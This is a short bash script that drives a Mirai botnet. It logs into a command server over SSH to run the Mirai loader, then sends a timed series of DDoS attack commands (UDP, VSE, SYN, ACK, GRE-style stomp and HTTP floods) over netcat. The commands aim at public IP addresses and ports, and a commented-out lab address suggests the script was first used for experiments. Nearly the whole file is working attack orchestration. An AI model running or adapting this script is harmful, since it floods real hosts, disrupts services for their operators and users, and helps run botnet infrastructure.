#!/bin/bash
TEMPO=10
USR="admin"
#SERVER="192.168.56.3"
SERVER="216.58.202.229"
#NC="nc 192.168.56.3 101"
NC="nc $SERVER 101"

sleep 5m
SECONDS=0
until ssh mirai@$SERVER "./run_loader.sh"; do sleep 5 ; done

sleep $((300 - $SECONDS))s
SECONDS=0
until ssh mirai@$SERVER "./run_loader.sh"; do sleep 5 ; done

sleep $((300 - $SECONDS))s
SECONDS=0
until ssh mirai@$SERVER "./run_loader.sh"; do sleep 5 ; done

sleep $((300 - $SECONDS))s
SECONDS=0
until ssh mirai@$SERVER "./run_loader.sh"; do sleep 5 ; done


until echo "$USR|udp 172.217.29.110 $TEMPO dport=443" |  $NC ; do sleep 5 ; done
sleep $((2*$TEMPO))s

until echo "$USR|vse 52.94.209.132 $TEMPO dport=27015" |  $NC ; do sleep 5 ; done
sleep $((2*$TEMPO))s

until echo "$USR|udpplain 130.149.17.8 $TEMPO dport=123" |  $NC ; do sleep 5 ; done
sleep $((2*$TEMPO))s

until echo "$USR|syn 93.184.216.34 $TEMPO dport=80" |  $NC ; do sleep 5 ; done
sleep $((2*$TEMPO))s

until echo "$USR|ack 35.174.82.237 $TEMPO dport=11095" |  $NC ; do sleep 5 ; done
sleep $((2*$TEMPO))s

until echo "$USR|stomp 34.240.169.254 $TEMPO dport=443" |  $NC ; do sleep 5 ; done
sleep $((2*$TEMPO))s

until echo "$USR|http 176.32.98.203 $TEMPO dport=80" |  $NC ; do sleep 5 ; done
sleep $((2*$TEMPO))s
